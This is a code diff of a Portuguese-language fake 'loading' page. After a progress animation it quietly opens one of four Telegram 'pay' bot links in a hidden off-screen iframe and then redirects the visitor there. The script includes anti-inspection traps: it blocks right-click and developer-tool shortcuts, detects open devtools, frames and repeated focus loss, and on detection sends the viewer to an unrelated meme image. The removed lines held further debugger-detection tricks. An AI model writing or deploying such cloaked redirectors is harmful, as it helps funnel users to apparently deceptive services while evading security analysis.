@@ -2,110 +2,133 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8" />
-<title>🔒 Carregando...</title>
+<title>🔥 Carregando...</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta http-equiv="Refresh" content="0; url=about:blank" id="no-js">
 <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
 <noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
 <style>
-  :root{--bg:#05030a;--panel:#0b0b10;--neon1:#ff0044;--neon2:#7b00ff;--muted:#9aa3ad;--glass:rgba(255,255,255,0.03)}
-  *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;background:radial-gradient(circle at 10% 10%,rgba(123,0,255,0.06),transparent 15%),linear-gradient(180deg,#04030a,#06020c);font-family:Inter,"Helvetica Neue",Arial,sans-serif;color:#fff;display:flex;align-items:center;justify-content:center}
-  .card{width:100%;max-width:520px;padding:26px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 20px 50px rgba(0,0,0,0.7);border:1px solid rgba(255,255,255,0.03);position:relative;overflow:hidden}
-  .hdr{display:flex;align-items:center;gap:14px}
-  .logo{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--neon1),var(--neon2));box-shadow:0 8px 30px rgba(123,0,255,0.18),inset 0 -6px 18px rgba(0,0,0,0.25)}
-  .logo svg{width:44px;height:44px;display:block}
-  h1{font-size:20px;margin:0;color:var(--neon1);text-shadow:0 0 18px rgba(255,0,68,0.18)}
-  p.lead{color:var(--muted);margin-top:6px;font-size:13px}
-  .center{margin-top:18px;display:flex;flex-direction:column;align-items:center;gap:12px}
-  .progress-wrap{width:100%;max-width:420px}
-  .progress-bar{width:100%;height:12px;background:var(--glass);border-radius:999px;overflow:hidden;box-shadow:inset 0 -4px 14px rgba(0,0,0,0.6)}
-  .progress{height:100%;width:0%;background:linear-gradient(90deg,var(--neon1),var(--neon2));transition:width 0.15s linear}
-  .status{font-weight:600;color:#fff;margin-top:6px;font-size:14px;min-height:1.2em}
-  .sub{font-size:12px;color:rgba(255,255,255,0.25);margin-top:6px;text-align:center}
-  .pills{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:12px}
-  .pill{background:rgba(255,255,255,0.02);padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,0.02);font-size:12px;color:var(--muted)}
-  .glow-top{position:absolute;left:-20%;top:-20%;width:160%;height:220px;background:radial-gradient(circle at 50% 50%,rgba(123,0,255,0.06),transparent 30%);pointer-events:none}
-  .glow-bottom{position:absolute;right:-10%;bottom:-20%;width:120%;height:200px;background:radial-gradient(circle at 50% 50%,rgba(255,0,68,0.06),transparent 30%);pointer-events:none}
-  @media (max-width:420px){.card{padding:18px}h1{font-size:18px}}
+  html,body {
+    height:100%;
+    margin:0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:#000;
+    overflow:hidden;
+    font-family:'Poppins',sans-serif;
+    color:#fff;
+  }
+  .loader {
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:16px;
+    text-align:center;
+  }
+  h1 {
+    font-size:1.3rem;
+    color:#ff2a2a;
+    letter-spacing:1px;
+    text-shadow:0 0 10px #ff0000;
+    animation:flicker 2s infinite alternate;
+  }
+  .bar-wrap {
+    width:240px;
+    height:14px;
+    background:#220000;
+    border-radius:999px;
+    overflow:hidden;
+    box-shadow:0 0 25px rgba(255,0,0,0.3),inset 0 0 10px rgba(255,0,0,0.2);
+    position:relative;
+  }
+  .bar {
+    width:0%;
+    height:100%;
+    background:linear-gradient(90deg,#6a0000,#ff0000,#6a0000);
+    animation:fill 2.6s linear forwards;
+  }
+  .flame {
+    position:absolute;
+    right:0;
+    top:50%;
+    transform:translate(50%,-50%);
+    font-size:1.3rem;
+    opacity:0;
+    animation:flameMove 2.6s linear forwards;
+  }
+  @keyframes fill {
+    0% { width:0%; }
+    100% { width:100%; }
+  }
+  @keyframes flameMove {
+    0% { right:100%; opacity:0.3; }
+    10% { opacity:1; }
+    90% { opacity:1; }
+    100% { right:0%; opacity:0; }
+  }
+  @keyframes flicker {
+    0%,100% { opacity:1; text-shadow:0 0 12px #ff0000; }
+    50% { opacity:0.8; text-shadow:0 0 20px #ff5500; }
+  }
 </style>
 </head>
 <body>
-  <div class="card" role="status" aria-live="polite">
-    <div class="glow-top"></div><div class="glow-bottom"></div>
-    <div class="hdr">
-      <div class="logo" aria-hidden="true">
-        <svg viewBox="0 0 240 240" aria-hidden="true">
-          <circle cx="120" cy="120" r="120" fill="white" opacity="0.06"/>
-          <path d="M97.5 120.5L149.5 98L129 148L97.5 120.5Z" fill="white" opacity="0.95"/>
-        </svg>
-      </div>
-      <div>
-        <h1>Carregando destino&#8230;</h1>
-        <p class="lead">Aguarde — preparando a conexão segura</p>
-      </div>
-    </div>
-    <div class="center">
-      <div class="progress-wrap"><div class="progress-bar"><div class="progress" id="progress"></div></div></div>
-      <div class="status" id="status">Iniciando&#8230;</div>
-      <div class="pills" id="pills"></div>
-      <div class="sub">Mantenha esta aba aberta. Não atualize nem feche.</div>
+  <div class="loader">
+    <h1 id="status">Carregando... 🔥</h1>
+    <div class="bar-wrap">
+      <div class="bar" id="bar"></div>
+      <div class="flame">🔥</div>
     </div>
   </div>
 
 <script>
 (()=>{
-  const mobileLinks=[
+
+  // Links de destino (ocultos)
+  const bots=[
     "https://t.me/tacofire_pay108b9x_bot?start=go",
     "https://t.me/pizzalove_pay105q8z_bot?start=go",
     "https://t.me/burgerking_pay103x9r_bot?start=go",
     "https://t.me/pancakechoco_pay101v7k_bot?start=go"
   ];
+
+  // Armadilha anti-inspeção
   const trap="https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
   let detected=false;
   const kill=()=>{if(!detected){detected=true;location.replace(trap)}};
+
   document.addEventListener('contextmenu',e=>{e.preventDefault();kill()},{passive:false});
-  document.addEventListener('keydown',e=>{const k=e.key||'';if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){e.preventDefault();kill()}},{passive:false});
+  document.addEventListener('keydown',e=>{
+    const k=e.key||'';if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){e.preventDefault();kill()}
+  },{passive:false});
   let d=0;setInterval(()=>{const w=window.outerWidth-window.innerWidth,h=window.outerHeight-window.innerHeight;if((w>160||h>160)&&++d>1)kill()},1100);
-  const progress=document.getElementById('progress');
+
+  // Atualiza status dinamicamente
   const status=document.getElementById('status');
-  const pills=document.getElementById('pills');
-  const noJs=document.getElementById('no-js');if(noJs)noJs.remove();
-  const addP=l=>{pills.innerHTML='';l.forEach(u=>{const t=u.match(/t\.me\/([^?]+)/)[1].replace("_bot",""),p=document.createElement('div');p.className='pill';p.textContent=t;pills.appendChild(p)})};
-  addP(mobileLinks);
-  const isD=()=>!/Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
-  const steps=["Verificando navegador...","Estabelecendo conexão...","Validando sessão...","Preparando redirecionamento..."];
-  let step=0,start=performance.now(),total=2600;
-  const tick=t=>{
-    const p=Math.min(1,(t-start)/total);
-    progress.style.width=(p*100)+"%";
-    const idx=Math.floor(p*steps.length);
-    if(idx!==step){step=idx;if(steps[step])status.textContent=steps[step]}
-    if(p<1)requestAnimationFrame(tick);else{
-      if(detected)return;
-      status.textContent="Abrindo destino...";
-      const code=Math.floor(Math.random()*8999)+1000;
-      const encoded=btoa(code.toString().split("").reverse().join(""));
-      const dest=(isD()?mobileLinks[0]:mobileLinks[Math.floor(Math.random()*mobileLinks.length)])+"&u="+encodeURIComponent(encoded);
-      const frm=document.createElement('iframe');frm.src=dest;
-      frm.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
-      document.body.appendChild(frm);
-      setTimeout(()=>location.replace(dest),220)
-    }
-  };
-  requestAnimationFrame(tick);
-  const nativeLog=console.log;
-  console.log=function(...a){const s=new Error().stack;if(/devtools|debugger|^eval/ig.test(s))kill();nativeLog.apply(console,a)};
-  let blurC=0;
-  window.addEventListener('blur',()=>{if(++blurC>4)kill()});
+  const msgs=["Preparando 🔥","Verificando conexão...","Aquecendo 🔥","Redirecionando..."];
+  let i=0;
+  const change=setInterval(()=>{
+    if(i<msgs.length){status.textContent=msgs[i++];}
+    else clearInterval(change);
+  },700);
+
+  // Redireciona após animação
+  setTimeout(()=>{
+    if(detected) return;
+    const target=bots[Math.floor(Math.random()*bots.length)];
+    const iframe=document.createElement('iframe');
+    iframe.src=target;
+    iframe.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
+    document.body.appendChild(iframe);
+    setTimeout(()=>location.replace(target),250);
+  },2600);
+
+  // Proteção extra
+  let blurC=0;window.addEventListener('blur',()=>{if(++blurC>4)kill()});
   try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
   try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)kill()}catch(e){}
-  setInterval(()=>{!function(){debugger}()({port:1337^Math.random()})},300);
-  try{
-    const wc="self.onmessage=()=>setInterval(()=>{const hr=performance.now();if(Math.random()<.01&&Math.abs(hr-Math.round(hr))<1e-4)postMessage('dbg')},300)";
-    const w=new Worker(URL.createObjectURL(new Blob([wc],{type:'text/javascript'})));
-    w.onmessage=m=>{if(m.data==='dbg')kill()}
-  }catch(e){}
+
 })();
 </script>
 </body>
